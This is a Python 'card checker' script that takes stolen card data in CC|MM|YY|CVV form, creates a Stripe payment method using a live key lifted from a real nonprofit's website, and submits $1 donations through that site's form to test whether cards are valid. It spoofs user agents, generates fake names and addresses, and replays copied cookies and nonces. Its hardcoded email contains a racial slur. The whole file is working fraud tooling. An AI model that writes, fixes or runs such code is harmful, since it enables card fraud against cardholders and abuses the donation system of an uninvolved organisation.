import random
import string
import requests
import json
import re

# ============================================================
# FIX 1: Remove external 'user_agent' dependency
# ============================================================
def generate_user_agent():
    """Return a realistic mobile user-agent string."""
    agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    ]
    return random.choice(agents)

# ============================================================
# Utility functions (unchanged)
# ============================================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ============================================================
# MAIN CHECKER FUNCTION – FIXED
# ============================================================
def Tele(ccx):
    """
    Accepts a card string in format: CC|MM|YY|CVV
    Returns the raw response text from the gateway (HTML/JSON).
    """
    ccx = ccx.strip()
    parts = ccx.split('|')
    if len(parts) != 4:
        return "ERROR: Invalid card format"

    n, mm, yy, cvc = parts

    # FIX 2: Robust month/year parsing
    # Remove leading zeros from month
    mm = mm.lstrip('0') or '0'   # if empty becomes '0'
    # Take last two digits of year
    yy = yy[-2:] if len(yy) > 2 else yy

    # Generate random data (some may be overridden later)
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    # ---- Step 1: Create Stripe Payment Method ----
    user_agent = generate_user_agent()
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data_stripe = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4cd120cf9f%3B+stripe-js-v3%2F4cd120cf9f%3B+card-element&referrer=https%3A%2F%2Fwww.siaprojects.org&key=pk_live_51MR3wSHEoKUO3mGVIj1JOGRPI0VK51TfIjUyHxNMlHRCU5IVhkqMFfl2WHbRLlstNp718Dpz6X6WFohnJHg9d3qa00NFUjJSss'

    try:
        resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=15)
        resp.raise_for_status()
        pm = resp.json()['id']
    except Exception as e:
        return f"STRIPE_ERROR: {str(e)}"

    # ---- Step 2: Submit form to SIA Projects ----
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_first_add': 'fd%3D2026-08-25%2010%3A57%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.siaprojects.org%2Fbecome-a-member%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
        '__stripe_mid': '5c33a955-e9e2-4fe7-af50-25c69fea4f72e80b74',
        '__stripe_sid': '3b5f8008-0f42-4f8d-bfca-c56dbd693b19a3f582',
        'sbjs_current_add': 'fd%3D2026-08-25%2011%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.siaprojects.org%2Fbecome-a-member%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.siaprojects.org%2Fbecome-a-member%2F',
    }

    headers_form = {
        'authority': 'www.siaprojects.org',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.siaprojects.org',
        'referer': 'https://www.siaprojects.org/become-a-member/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {'t': 1787656860246}   # dynamic timestamp

    data_form = {
        'data': f'__fluent_form_embded_post_id=122&_fluentform_15_fluentformnonce=5b0254df82&_wp_http_referer=%2Fbecome-a-member%2F&names%5Bfirst_name%5D=Jhon&names%5Blast_name%5D=Anderson&email=blackniggu338%40gmail.com&phone=2025808524&payment_input=Custom%20Amount&custom-payment-amount=1&payment_method=stripe&address_1%5Baddress_line_1%5D=13th%20Street%20avenue&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=&address_1%5Bcountry%5D=US&description=&__entry_intermediate_hash=45f911f25572031052b307ec4cbc1189&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '15',
    }

    try:
        response = requests.post(
            'https://www.siaprojects.org/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers_form,
            data=data_form,
            timeout=15
        )
        response.raise_for_status()
        return response.text
    except Exception as e:
        return f"FORM_SUBMISSION_ERROR: {str(e)}"